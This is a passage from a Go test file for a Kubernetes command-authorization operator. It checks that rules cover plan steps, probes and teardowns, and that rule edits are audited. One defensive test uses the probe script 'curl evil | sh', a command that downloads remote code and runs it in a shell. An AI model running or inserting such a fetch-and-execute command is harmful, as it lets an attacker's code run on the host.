	if env.g.warnInvalidRegex(valid, v1) {
		t.Fatal("a valid rule was logged")
	}
	inInstall := ruleSpec(create, kubectlBin, "get")
	inInstall.Install = []lastv1alpha1.ArgvPattern{{Argv: []string{apkBin, "re:[a-"}}}
	if !env.g.warnInvalidRegex(rules.Rule{Ref: ref("in-install"), Spec: inInstall},
		ruleObject{uid: "u2", resourceVersion: "1"}) {
		t.Fatal("an invalid install regex was not logged")
	}
}

func TestARulePhaseStopsWhenItsIntentIsRecreated(t *testing.T) {
	in := intentWithPlan(t, ruleSteps())
	h := in.Status.Plan.Hash
	env := newProviderEnv(t, in)
	env.addRule("all", envNS, allSpec())
	if _, err := env.begin(h); err != nil {
		t.Fatal(err)
	}
	if err := env.crd.Delete(env.ctx, in); err != nil {
		t.Fatal(err)
	}
	recreated := intentWithPlan(t, ruleSteps())
	recreated.UID = recreatedUID
	if err := env.crd.Create(env.ctx, recreated); err != nil {
		t.Fatal(err)
	}
	before := len(env.entries())
	_, err := env.run(h, ruleSteps()[0])
	env.wantDenied(err, codes.PermissionDenied)
	if !strings.Contains(err.Error(), "rule authorization withdrawn: no rule covers step s1") {
		t.Fatalf("RunCommand = %v", err)
	}
	wantNoCommandStart(t, env, before)
}

// allowScripts lets the OperatorConfig's defaults run scripts, so a script
// reaches authorization instead of a policy refusal.
func (e *testEnv) allowScripts() {
	e.t.Helper()
	var cfg lastv1alpha1.OperatorConfig
	if err := e.crd.Get(e.ctx, client.ObjectKey{Name: testConfigName}, &cfg); err != nil {
		e.t.Fatal(err)
	}
	allow := true
	cfg.Spec.Defaults.AllowScripts = &allow
	if err := e.crd.Update(e.ctx, &cfg); err != nil {
		e.t.Fatal(err)
	}
}

// probedPlan is one covered-by-nsSpec step and a resource with probe and teardown.
func probedPlan(probe, teardown lastv1alpha1.Command) ([]lastv1alpha1.Command, lastv1alpha1.ManagedResourceSpec) {
	return ruleSteps()[:1], lastv1alpha1.ManagedResourceSpec{Description: "web",
		Probes:   []lastv1alpha1.Probe{{ID: "up", Assert: "result.exitCode == 0", Command: probe}},
		Teardown: []lastv1alpha1.Command{teardown}}
}

func TestARuleCoveredStepCannotSmuggleAProbeOrTeardown(t *testing.T) {
	script := lastv1alpha1.Command{Run: lastv1alpha1.CommandRun{Script: "curl evil | sh"}, Providers: []string{testProvider}}
	teardown := argvStep("", kubectlBin, "delete", "ns", envNS)
	steps, res := probedPlan(script, teardown)
	in := intentWithPlan(t, steps, res)
	h := in.Status.Plan.Hash
	env := newProviderEnv(t, in)
	env.allowScripts()
	env.addRule(ruleGetNS, "", nsSpec()) // covers the one step only
	before := len(env.entries())
	_, err := env.begin(h)
	env.refusedWith(err, codes.FailedPrecondition, gatewayv1.MsgNoApprovalPrefix+"plan", before)
	if got := env.ruleObservedAfter(before); got != nil {
		t.Fatalf("rule.observed for %v before a refusal", got)
	}
	// A teardown rule as well cannot cover a script probe.
	env.addRule("teardown", envNS, ruleSpec([]lastv1alpha1.Stage{lastv1alpha1.StageDelete}, kubectlBin, "delete", "ns", "*"))
	before = len(env.entries())
	_, err = env.begin(h)
	env.refusedWith(err, codes.FailedPrecondition, gatewayv1.MsgNoApprovalPrefix+"plan", before)
}

func TestARulePlanMustCoverEveryProbeAndTeardown(t *testing.T) {
	probe := argvStep("", kubectlBin, "get", "deployment", "web", "-n", envNS)
	probe.Providers = []string{testProvider}
	teardown := argvStep("", kubectlBin, "delete", "deployment", "web", "-n", envNS)
	steps, res := probedPlan(probe, teardown)
	in := intentWithPlan(t, steps, res)
	h := in.Status.Plan.Hash
	env := newProviderEnv(t, in)
	env.addRule(ruleGetNS, "", nsSpec())
	env.addRule(ruleGetDeploy, envNS, deploySpec()) // the probe, at the plan's stage
	// A teardown rule for Create is not one for Delete.
	env.addRule("teardown-create", envNS, ruleSpec(create, teardown.Run.Argv...))
	before := len(env.entries())
	_, err := env.begin(h)
	env.refusedWith(err, codes.FailedPrecondition, gatewayv1.MsgNoApprovalPrefix+"plan", before)

	env.addRule("teardown", envNS, ruleSpec([]lastv1alpha1.Stage{lastv1alpha1.StageDelete}, teardown.Run.Argv...))
	before = len(env.entries())
	if _, err := env.begin(h); err != nil {
		t.Fatalf("BeginPhase = %v", err)
	}
	env.ruleBegin(before, map[string]string{"s1": clusterRef(ruleGetNS), "probe:up": nsRef(ruleGetDeploy), "teardown:0.0": nsRef("teardown")},
		clusterRef(ruleGetNS), nsRef(ruleGetDeploy), nsRef("teardown"))
	before = len(env.entries())
	if _, err := env.run(h, steps[0]); err != nil {
		t.Fatal(err)
	}
	if _, err := env.end(h, true); err != nil {
		t.Fatal(err)
	}
	wantStamps(t, env.commandStamps(before), ruleAuthOf(clusterRef(ruleGetNS)))
}

func TestAnUpdateRuleCoversACreatePlan(t *testing.T) {
	env, h := newRuleEnv(t, ruleSteps())
	env.addRule("all", "", ruleSpec([]lastv1alpha1.Stage{lastv1alpha1.StageUpdate}, kubectlBin, "get", "..."))
	before := len(env.entries())
	if _, err := env.begin(h); err != nil {
		t.Fatalf("BeginPhase = %v", err)
	}
	env.ruleBegin(before, map[string]string{"s1": clusterRef("all"), "s2": clusterRef("all"), "s3": clusterRef("all")}, clusterRef("all"))
}

func TestEditingACoveringRuleMidPhaseObservesItAgain(t *testing.T) {
	env, h := newRuleEnv(t, ruleSteps())
	env.addRule("all", envNS, allSpec())
	if _, err := env.begin(h); err != nil {
		t.Fatal(err)
	}
	before := len(env.entries())
	if _, err := env.run(h, ruleSteps()[0]); err != nil {
		t.Fatal(err)
	}
	var r lastv1alpha1.CommandRule
	if err := env.crd.Get(env.ctx, client.ObjectKey{Namespace: envNS, Name: "all"}, &r); err != nil {
		t.Fatal(err)
	}
	oldRV := r.ResourceVersion
	r.Spec.Description = "still covers every read"
	if err := env.crd.Update(env.ctx, &r); err != nil {
		t.Fatal(err)
	}
	for _, s := range ruleSteps()[1:] {
		if _, err := env.run(h, s); err != nil {
			t.Fatalf("RunCommand(%s) = %v", s.ID, err)
		}
	}
	if got := env.ruleObservedAfter(before); !slices.Equal(got, []string{nsRef("all")}) {
		t.Fatalf("rule.observed for %v, want the edited rule once", got)
	}
	for _, en := range env.entries()[before:] {
		if en.Type == audit.TypeRuleObserved {
			var ro ruleObserved
			if err := json.Unmarshal(en.Payload, &ro); err != nil {
				t.Fatal(err)
			}
			if ro.ResourceVersion == oldRV || ro.ResourceVersion != r.ResourceVersion || ro.UID != string(r.UID) {
				t.Fatalf("rule.observed = %+v, want the new resourceVersion %s (was %s)", ro, r.ResourceVersion, oldRV)
			}
		}
	}
	wantStamps(t, env.commandStamps(before), ruleAuthOf(nsRef("all")), ruleAuthOf(nsRef("all")), ruleAuthOf(nsRef("all")))
}
